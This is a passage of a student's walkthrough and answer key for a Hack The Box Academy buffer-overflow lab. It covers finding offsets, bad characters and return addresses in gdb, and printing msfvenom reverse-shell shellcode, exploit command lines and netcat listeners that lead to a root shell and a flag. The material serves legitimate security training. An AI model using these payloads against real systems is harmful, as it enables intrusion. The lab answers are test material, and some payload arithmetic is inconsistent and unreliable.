0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |----> Shellcode begins
<SNIP>
```

Q: Submit the size of the stack space after overwriting the EIP as the answer. (Format: 0x00000)

**Hint: With "help info" in GDB, further hints can help to view the processes and their information.**

A: 

**Solution**

Connect to the machine using `vpn` and `ssh` after the run the binary in `gdb` using the command `gdb -q bow` and after that set break point in bow function using the command `break bowfunc` we know the `bowfunc` is in the program if not use `disas main` command to disassemble the main function and see yourself the `bowfunc` is there. now our break point is set so we are good to go to launch our `shellcode` but first we have to generate our shell code using the following command syntax
```shell
$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST IP> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```
This command syntax generate a file with our specified name and that have the following content in it your would be different
```
unsigned char buf[] =   
"\xbb\xcc\x54\x8d\xae\xda\xd2\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"  
"\x12\x31\x5a\x12\x83\xc2\x04\x03\x96\x5a\x6f\x5b\x17\xb8\x98"  
"\x47\x04\x7d\x34\xe2\xa8\x08\x5b\x42\xca\xc7\x1c\x30\x4b\x68"  
"\x23\xfa\xeb\xc1\x25\xfd\x83\xdb\xdf\xf2\xea\xb4\xdd\x0c\x1d"  
"\x19\x6b\xed\xad\xc7\x3b\xbf\x9e\xb4\xbf\xb6\xc1\x76\x3f\x9a"  
"\x69\xe7\x6f\x68\x01\x9f\x40\xa1\xb3\x36\x16\x5e\x61\x9a\xa1"  
"\x40\x35\x17\x7f\x02";
```
So we have to remove the fist line and newlines and make him a single line shell code after editing they look like this
```
\xbb\xcc\x54\x8d\xae\xda\xd2\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x31\x5a\x12\x83\xc2\x04\x03\x96\x5a\x6f\x5b\x17\xb8\x98\x47\x04\x7d\x34\xe2\xa8\x08\x5b\x42\xca\xc7\x1c\x30\x4b\x68\x23\xfa\xeb\xc1\x25\xfd\x83\xdb\xdf\xf2\xea\xb4\xdd\x0c\x1d\x19\x6b\xed\xad\xc7\x3b\xbf\x9e\xb4\xbf\xb6\xc1\x76\x3f\x9a\x69\xe7\x6f\x68\x01\x9f\x40\xa1\xb3\x36\x16\x5e\x61\x9a\xa1\x40\x35\x17\x7f\x02
```
so now we have to use the following command in `gdb` to run exploit our shell code
```gdb
 run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xbb\xcc\x54\x8d\xae\xda\xd2\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x31\x5a\x12\x83\xc2\x04\x03\x96\x5a\x6f\x5b\x17\xb8\x98\x47\x04\x7d\x34\xe2\xa8\x08\x5b\x42\xca\xc7\x1c\x30\x4b\x68\x23\xfa\xeb\xc1\x25\xfd\x83\xdb\xdf\xf2\xea\xb4\xdd\x0c\x1d\x19\x6b\xed\xad\xc7\x3b\xbf\x9e\xb4\xbf\xb6\xc1\x76\x3f\x9a\x69\xe7\x6f\x68\x01\x9f\x40\xa1\xb3\x36\x16\x5e\x61\x9a\xa1\x40\x35\x17\x7f\x02" + "\x66" * 4')
```
So when we run that command we can see the our break point will hint so now we can see our register value using the following command in `gdb`
```gdb
(gdb) x/2000xb $esp+550
```

There we can see our shell code 
```
xffffd672:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
#---> shell code start
0xffffd67a:     0x90    0xbb    0xcc    0x54    0x8d    0xae    0xda    0xd2  
0xffffd682:     0xd9    0x74    0x24    0xf4    0x5a    0x29    0xc9    0xb1  
0xffffd68a:     0x12    0x31    0x5a    0x12    0x83    0xc2    0x04    0x03  
0xffffd692:     0x96    0x5a    0x6f    0x5b    0x17    0xb8    0x98    0x47  
0xffffd69a:     0x04    0x7d    0x34    0xe2    0xa8    0x08    0x5b    0x42  
0xffffd6a2:     0xca    0xc7    0x1c    0x30    0x4b    0x68    0x23    0xfa  
0xffffd6aa:     0xeb    0xc1    0x25    0xfd    0x83    0xdb    0xdf    0xf2  
0xffffd6b2:     0xea    0xb4    0xdd    0x0c    0x1d    0x19    0x6b    0xed  
0xffffd6ba:     0xad    0xc7    0x3b    0xbf    0x9e    0xb4    0xbf    0xb6  
0xffffd6c2:     0xc1    0x76    0x3f    0x9a    0x69    0xe7    0x6f    0x68  
0xffffd6ca:     0x01    0x9f    0x40    0xa1    0xb3    0x36    0x16    0x5e  
0xffffd6d2:     0x61    0x9a    0xa1    0x40    0x35    0x17    0x7f    0x02
#--> shell code end
```
So that's mean we fire our shell code in memory so to solve the exercise we use the following command in `gdb`
```gdb
(gdb) info proc mappings
```
there output is have things like following
```
Mapped address spaces:  
  
       Start Addr   End Addr       Size     Offset objfile  
       0x56555000 0x56556000     0x1000        0x0 /home/htb-student/bow  
       0x56556000 0x56557000     0x1000        0x0 /home/htb-student/bow  
       0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/bow  
       0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so  
       0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so  
       0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so  
       0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so  
       0xf7fc3000 0xf7fc6000     0x3000        0x0    
       0xf7fcf000 0xf7fd1000     0x2000        0x0    
       0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]  
       0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]  
       0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so  
       0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so  
       0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	   # ---> Check the stack value 
       0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```
There we see in the end there is `offset objfile`stack and its size is `ox21000` and that's our exercise question

**Page 10 / Identification of the Return Address**

# Identification of the Return Address

After checking that we still control the EIP with our shellcode, we now need a memory address where our NOPs are located to tell the EIP to jump to it. This memory address must not contain any of the bad characters we found previously.

#### GDB NOPS

GDB NOPS

```shell-session
(gdb) x/2000xb $esp+1400

<SNIP>
0xffffd5ec:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5f4:	0x55	0x55	0x55	0x55	0x55	0x55	0x90	0x90
								# End of "\x55"s   ---->|  |---> NOPS
0xffffd5fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd604:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd60c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd614:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd61c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd624:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd62c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd634:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd63c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd644:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |---> Shellcode
<SNIP>
```

Here, we now have to choose an address to which we refer the `EIP` and which reads and executes one byte after the other starting at this address. In this example, we take the address `0xffffd64c`. Illustrated, it then looks like this:

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_9.png)

After selecting a memory address, we replace our "`\x66`" which overwrites the EIP to tell it to jump to the `0xffffd64c` address. Note that the input of the address is entered backward.

#### Notes

Notes

```shell-session
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 841
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
      EIP = "\x4c\xd6\xff\xff"
```

Since our shellcode creates a reverse shell, we let `netcat` listen on port 31337.

#### Netcat - Reverse Shell Listener

Netcat - Reverse Shell Listener

```shell-session
student@nix-bow:$ nc -nlvp 31337

Listening on [0.0.0.0] (family 0, port 31337)
```

After starting our `netcat` listener, we now run our adapted exploit again, which then triggers the CPU to connect to our listener.

#### Exploitation

Exploitation

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

#### Netcat - Reverse Shell Listener

Netcat - Reverse Shell Listener

```shell-session
Listening on [0.0.0.0] (family 0, port 31337)
Connection from 127.0.0.1 33504 received!

id

uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

We now see that we got a connection from the local IP address. However, it is not obvious if we have a shell. So we type the command "`id`" to get more information about the user. If we get a return value with information, we know that we are in a shell, as shown in the example.

**Page 11 / Public Exploit Modification**

# Public Exploit Modification

It can happen that during our penetration test, we come across outdated software and find an exploit that exploits an already known vulnerability. These exploits often contain intentional errors in the code. These errors often serve as a security measure because inexperienced beginners cannot directly execute these vulnerabilities to prevent harm to the individuals and organizations that may be affected by this vulnerability.

To edit and customize them, the most important thing is to understand how the vulnerability works, what function the vulnerability is in, and how to trigger execution. With almost all exploits, we will have to adapt the shellcode to our conditions. Instead, it depends on the complexity of the exploit.

It plays a significant role in whether the shellcode has been adapted to the protection mechanisms or not. In this case, our shellcode with a different length can have an unwanted effect. Such exploits can be written in different languages or only as a description.

The exploits may be different from the operating system, resulting in a different instruction, for example. It is essential to set up an identical system where we can try our exploit before running it blind on our target system. Such exploits can cause the system to crash, preventing us from further testing the service. Since it is part of our everyday life to continually find our way in new environments and always learn to keep the overview, we have to use new situations to improve and perfect this ability. Therefore we can use two applications to train these skills.

**Page 12 / Prevention Techniques and Mechanisms**

# Prevention Techniques and Mechanisms

The best protection against buffer overflows is security-conscious programming. Software developers should inform themselves about the relevant pitfalls and strive for deliberately secure programming. Besides, there are security mechanisms that support developers and prevent users from exploiting such vulnerabilities.

These include security mechanisms:

-   `Canaries`
-   `Address Space Layout Randomization` (`ASLR`)
-   `Data Execution Prevention` (`DEP`)

---

## Canaries

The `canaries` are known values written to the stack between buffer and control data to detect buffer overflows. The principle is that in case of a buffer overflow, the canary would be overwritten first and that the operating system checks during runtime that the canary is present and unaltered.

---

## Address Space Layout Randomization (ASLR)

Address Space Layout Randomization (`ASLR`) is a security mechanism against buffer overflows. It makes some types of attacks more difficult by making it difficult to find target addresses in memory. The operating system uses ASLR to hide the relevant memory addresses from us. So the addresses need to be guessed, where a wrong address most likely causes a crash of the program, and accordingly, only one attempt exists.

---

## Data Execution Prevention (DEP)

`DEP` is a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.

**Page 13 / Skills Assessment - Buffer Overflow**

# Skills Assessment

---

We were able to gain SSH access to a Linux machine whose password was reused by another machine during our penetration test.

On this machine, we have a standard user "`htb-student`" who can leave a message to the administrator using a self-written program called "`leave_msg`." Since the target company pays a lot of attention to defense from outside their network, and the administrator's appearance showed high self-confidence, it may indicate that local security was disregarded.

After our research, we found out that these messages are stored in "`/htb-student/msg.txt`," which is binary owned by the user `root`, and the `SUID` bit is set.

Examine the program and find out if it is vulnerable to a Stack-Based Buffer Overflow. If you have found the vulnerability, then use it to read the file "`/root/flag.txt`" placed on the system as proof.

Q1: Determine the file type of "leave_msg" binary and submit it as the answer.

**Hint: Knowing for which CPU architecture the binary has been compiled also belongs to the file type.**

A: ELF 32-bit

**Solution**
```
Note: Connect to Academy Vpn and ssh First
```
In `htb-student` home directory there is a binary name `leave_msg` that we have to test.Use `file` command on it and there you can see the type of the binary and its architecture information
```
$ file leave_msg |tr "," "\n"
```


Q2: How many bytes in total must be sent before reaching EIP?

A: 2060

**Solution**

Open The binary in `gdb` using the following command
```shell
$ gdb -q leave_msg
```
After that use the following command to change its syntax into `intel` processor format it is not mandatory
```shell
(gdb) set disassembly-flavor intel
```
Now use the command `disassemble main` and `disassemble leavemsg`.This will show you assembly language of program in memory.So after that we see there is a function name `leavemsg` that get our input and we have to abuse that function.To do that first we have to submit too many bytes to it so we can check where they show us error message `segmentation fault` to do that we use python in `gdb`
```gdb
(gdb)run $(python -c 'print "\x55"*1000')
```
There we use `\x55` that are `U` in hex up to `1000` bytes they will like this in memory
```
0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55 ....<snip>
```
They will execute smoothly that means they will not disturbed our program but when we  increase our bytes up to 2550 or more they show us an error message called `segmentation fault` so now we know how much bytes we need to do a segmentation fault error that our first step.
**Step 1>Identify where segmentation fault occurs**
Now we know where segmentation fault occur now we have to know the exact bytes number to  where segmentation fault occur so to find out that we use `metasploit`script name `pattern_create.rb` that create a pattern for using our required no bytes like we know `2550` bytes will cause an segmentation fault error so we create a pattern in `2550` bytes using the following command script 
```shell
$  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2550 > pattern.txt
```
Now we create a pattern so copy the pattern and paste it in python command like the following
```gdb
(gdb) run $(python -c 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab...<snip>')
```
When we run that we see the segmentation fault error like before but we see some value/address also that cause the error we can see it using the following command
```gdb
(gdb) info register eip
```
copy the `EIP` value and we use that value to find what are the exact no bytes that cause the segmentation fault.Paste the address value after the `-q` in Metasploit script `pattern_offset` like follows  
```shell
$  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
```
They show us the exact number of bytes where segmentation fault occurs.
That is step two in BOF
**Step 2>Finding the offset where segmentation fault occur using pattern_create and pattern_offset metasploit script or any other source**
The exact no of bytes where segmentation fault occur is our answer in this task.

Q3: Submit the size of the stack space after overwriting the EIP as the answer. (Format: 0x00000)

A: 0x22000

**Solution**

In the previous question we find the exact no bytes where our program show segmentation fault error using metasploit script `pattern_create.rb` and `pattern_offset` so now our buffer overflow notes is
```BOF Notes
Buffer = 2060 bytes
```
After 2060 bytes we discovered the `eip` value and now we can easily overwrite the `eip` and we can control the `eip` But for safety we use 8 bytes after the buffer.So our notes now   
```BOF Notes
Buffer = 2060 bytes
eip = 8 bytes
```
So now we can control the `eip` now let find out our shellcode length to do that we have to make a testing shellcode we can do that using the following command.
```
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 --platform linux --arch x86 --format c
```
Here we use `msfvenom` that are metasploit module that are use to generate different payloads.
Here,
- **`-p`:** Is use for specify payload type
- **`LHOST`:** Is use to specify Local Host Address where we receives the connection
- **`LPORT`**: Is use to specify Local Host Port where they connect
- **`--platform`**: Is use to specify the platform(operating system)
- **`--arch`**: Is use to specify target architecture
- **`--format`**: Is use to specify the format like `c`.As we are testing `c` program so we use format `c`
Its Output is like following 
```shell-session
W4H33D@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c

No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
<SNIP>
```
There we see our temporary payload size is 68 bytes and we add some NOP's before the payload so they will execute smoothly.So now our BOF Notes are following
```BOF Notes
Buffer = 2060
eip = 8 bytes
shellcode = 68 bytes
NOP's = 100
```
So Now we have every thing we need to exploit buffer overflow but we strictly follow the  following instructing to exploit it correctly
```
[Buffer]+[NOP's]+[ShellCode]+[Eip] 
```
1. We have total 2060 bytes and we have to manage write our Buffer,NOP's and shellcode in it
2. After that we have find which address NOP's start and where it end's and shellcode begins
3. We can use any address between NOP's and ShellCode
4. In Last we use that address bytes to overwrite the `eip` value

So let's start with Buffer,NOP's and shellcode.
```
Buffer = Totel Buffer - NOP's - ShellCode - EIP

Example:

Buffer = 2060 - 100 - 68 - 8
```
So we use that information in `gdb` with the following command syntax
```gdb
(gdb) run $(python -c "print '\x55'*(2060-100-68 - 8)+'\x90'*100+'shellcode'+'eip'*8*")
```
This is all we need here
- `\x55` is our buffer 
- `\x90` is NOP's
- `shellcode` This contains our shell code
- `eip` This contains any address between NOP's and shellcode

By Putting all the values they are like following

```gdb
(gdb) run $(python -c "print '\x55'*(2060-100-68-8)+'\x90'*73+'\xbd\xb4\xeb\x88..<snip>..\x47\x84\x13\x5d\xd5\x05\xad'+'\x66'*8")
```
If the program show segmentation fault error with the address like `0x66666666` then we are on right track.So now we have to find Bad characters so we can exclude bad characters from our payload.Bad Characters are following  
```
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
This is the total bad characters now we use bad character in our shellcode place like the following command syntax
```gdb
(gdb) run $(python -c "'\x55'*(2060-100-68-8)+'\x00\x01\x02\x03\x04\x05\x06\x07\..<snip>..\xfb\xfc\xfd\xfe\xff'+'\x66'*8*")
```
After that we use the following command in `gdb`
```gdb
(gdb) x/2000xb $esp+500
```
This will show you all the data in memory there you have to find where our bad characters start and then find which character will not include there like the following steps
```
<snip...>

0xffffd2b0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00  
0xffffd2c8:     0x64    0x65    0x6e    0x74    0x2f    0x62    0x6f    0x77  # --> From here our suplied buffer values starts   
0xffffd2d8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55 
<snip...>  
0xffffd5d8:     0x55    0x55    0x55         # ---> From Here our Bad Characters starts       0x01    0x02    0x03  
0xffffd5e0:     0x04    0x05    0x06    0x07    0x08 # ---> From here we expect "0x09"   0x00    0x0b    0x0c  
---Type <return> to continue, or q <return> to quit---  
0xffffd5e8:     0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14  
0xffffd5f0:     0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c  
0xffffd5f8:     0x1d    0x1e    0x1f    0x00    0x21    0x22    0x23    0x24  
...<snip>... 
0xffffd628:     0x4d    0x4e    0x4f    0x50    0x51    0x52    0x53    0x54
```
There we see after a series of `0x55`(Our buffer value (`\x55`) that we passed to the program) our bad characters starts and we see they are start with `0x01` but in our bad character list is start with `\x00` that are equal to `0x00` so that mean `\x00` is a bad character so we have to remove it from our payload after that we also see after the `0x08` there is `0x00` value that we know is a bad character and also we expect to have a value of `0x09` because if we see in our bad characters list after `\x08` the next value is `\x09` that are equal to `0x09`.So that means `0x09` is also a bad character and we have to remove it also so we follow the same procedure again and again to find all bad character and any time we find any bad character we have to remove it also in our python command like follows
```
(gdb) run $(python -c "'\x55'*(2060-100-68-8)+'\x01\x02\x03\x04\x05\x06\x07\0x8\0xb..<snip>..\xfb\xfc\xfd\xfe\xff'+'\x66'*8*")
```
There you can see we start our bad character with `\x01` not with `\x00` because we know they are a bad character like so we have to remove `\x09` also and any other bad character you find just see which character is missing and confirm him with our list if they are on our list but not in memory so that means they are a bad character.This is just an example how you find the bad character you will find different one but when you find our they are following.
```
\x00\x09\x0a\x20
```
So they are all the bad character we find so now we know which bad character we exclude from our payload so we use the following `msfvenom` command syntax to make a payload that are not include bad characters in it.
Command Syntax:
```msf
$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```
After giving all the values they will like follows
```
$ msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.10.1 lport=4444 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out ShellCode
```
So they give us the shell code but use your `lhost` and `lport` respectively and now you will see payload size will increases to `95` bytes or more so now you have to calculate all the values again.
```BOF Notes
Buffer = 2060

NOP's = 100

ShellCode = 98

EIP = 8 bytes
```
**Here is the Tip how to calculate buffer value**:

To calculate you just have adjust all the the values in the total buffer value(`2060`)
Like the following
Python Syntax:
```gdb
(gdb) run $(python -c "print '\x55'*(2060-181-95-8)+'\x90'*189+'ShellCode here'+'\x66'*8")
```
There you will see `(2060-181-95-8)` that are equal to `1776` so how many bytes left `2060-1776` is equal to `284` so in which `98` bytes is for our shellcode and all the other bytes is for our NOP's.

So now we calculate the exploit the only thing is left is our return address so to find that run the above command but paste the shellcode in it and after that use the following command again.
```gdb
(gdb) x/2000xb $esp+500
```
There you will all the memory address but you have to copy any address between the NOP's like follows
```
0xffffd604:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd60c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd614:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd61c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd624:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd62c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
```
So there we suppose we use `0xffffd60c` so we put that address in our `eip` place in python command but first we have to change that address in `intel` processor format.In inter processor we have to use that address in backward like follows:
```
\x0c\xd6\xff\xff
```
So now our python command are following
```gdb
(gdb) run $(python -c "print '\x55'*(2060-181-95-8)+'\x90'*189+'ShellCode here'+'\x0c\xd6\xff\xff'*8")
```
**Note paste you shell code in the command**
Now run that command and you will see and exception is show that say they open other binary name `\bin\dash` or something like this so that means our BOF will execute properly and to find the answer of this question now you will use the following command
```(gdb)
(gdb) info proc mappings
```
There in last you will see the stack value.If you will not able to see the output then use `break leavemsg` command and then again use the python command and after that use `info proc mappings` command and you will find the answer of this question

Q4: Read the file "/root/flag.txt" and submit the content as the answer.

A: HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}

**Solution**

In Previous task we successfully able to do a buffer overflow and now we know what is the exact values we have to submit to do a buffer overflow so now open a netcat listener in you system using the following command 
```bash
$ nc -lvnp 4444
```
If you use other port instead of `4444` then use that port number.After that submit the python command you will use to do buffer overflow in `gdb` like follows
```bash
htb-student:~$ ./leave_msg $(python -c "print '\x55'*(2060-181-95-8)+'\x90'*189+'ShellCode here'+'\x0c\xd6\xff\xff'*8")
```
**Note: Submit your shellcode in the command above**
If every thing gone right you will got a reverse shell back to you netcat listener and they have a root access so you can use command `cat /root/flag.txt` to read the flag.

-----

# Summary Of Buffer Overflow

1. Find the how many byte we need to do a segmentation fault error
2. Find the exact no bytes/offset where segmentation fault occurs
3. Take Control to the EIP
4. Determine Bad Characters
5. Determine the ShellCode Length.
6. Add Some NOP's before the ShellCode
7. Find any one memory address between NOP's and ShellCode.
8. Change that address into system architecture format like `intel` format is backward
9. Combine all of the above to exploit the vulnerability

-----
